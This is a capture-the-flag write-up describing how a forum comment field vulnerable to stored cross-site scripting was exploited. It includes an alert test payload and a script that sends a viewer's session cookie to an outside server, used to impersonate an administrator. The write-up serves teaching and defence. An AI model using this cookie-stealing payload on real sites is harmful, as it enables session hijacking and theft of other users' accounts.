Title: Exploiting a Cross-Site Scripting Vulnerability to Steal Session Cookies

During a CTF event, I came across a web application that allowed users to post comments on a public forum. I noticed that the application didn't seem to sanitize user input properly, which made me suspect that it might be vulnerable to Cross-Site Scripting (XSS) attacks. If exploited, an XSS vulnerability could allow me to execute malicious JavaScript in the context of other users' browsers, potentially leading to information disclosure or unauthorized actions.

To test for an XSS vulnerability, I submitted a comment containing a simple JavaScript payload, such as <script>alert(1);</script>. When the web application displayed the comment with the JavaScript payload and triggered the alert, it confirmed the presence of an XSS vulnerability.

To exploit the XSS vulnerability and obtain the flag for the Web Exploitation challenge, I crafted a comment containing JavaScript code that would send the user's session cookie to my own server. For example:

```
<script>
  var xhttp = new XMLHttpRequest();
  xhttp.open("GET", "http://my-server.com/steal-cookie?cookie=" + encodeURIComponent(document.cookie), true);
  xhttp.send();
</script>
```

After submitting the crafted comment, I waited for a privileged user (e.g., an administrator) to view the comment. When the JavaScript payload executed in the context of the privileged user's browser, it sent their session cookie to my server. With the stolen session cookie, I was able to impersonate the privileged user and access the restricted area containing the flag.

This CTF writeup highlights the importance of properly sanitizing and validating user input in web applications to prevent XSS vulnerabilities. By exploiting the XSS vulnerability, I was able to execute malicious JavaScript in the context of other users' browsers, steal a privileged user's session cookie, and obtain the flag needed to complete the challenge.
